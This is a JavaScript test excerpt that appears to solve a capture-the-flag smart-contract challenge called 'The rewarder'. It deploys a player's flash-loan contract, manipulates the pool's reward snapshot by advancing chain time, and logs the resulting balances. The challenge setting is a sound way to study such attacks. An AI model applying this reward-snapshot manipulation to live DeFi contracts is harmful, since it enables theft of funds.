...
describe("[Challenge] The rewarder", function () {
  ...
  it("Execution", async function () {
    ...
    let lastRecordedSnapshotTimestamp =
      await rewarderPool.lastRecordedSnapshotTimestamp();
    let initialBlockTimestamp = (await ethers.provider.getBlock("latest"))
      .timestamp;
    console.log(
      "lastRecordedSnapshotTimestamp",
      lastRecordedSnapshotTimestamp.toString()
    );

    console.log("initialBlockTimestamp", initialBlockTimestamp.toString());

    let testFlashloanRewarder = await (
      await ethers.getContractFactory("testFlashloanRewarder", player)
    ).deploy(
    ...
    await testFlashloanRewarder.start();

    await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 days
    await ethers.provider.send("evm_mine");

    let b = await accountingToken.balanceOf(testFlashloanRewarder.address);
    console.log(
      "testFlashloanRewarder accountingToken balance after deposit and withdraw",
      b.toString()
    );

    await testFlashloanRewarder.end();
    await rewarderPool.connect(player).distributeRewards();

    b = await rewardToken.balanceOf(player.address);
    console.log("player balance", b.toString());
    b = await rewardToken.balanceOf(testFlashloanRewarder.address);
    console.log("testFlashloanRewarder balance", b.toString());

    b = await accountingToken.balanceOf(testFlashloanRewarder.address);
    console.log("testFlashloanRewarder accountingToken balance", b.toString());
  });
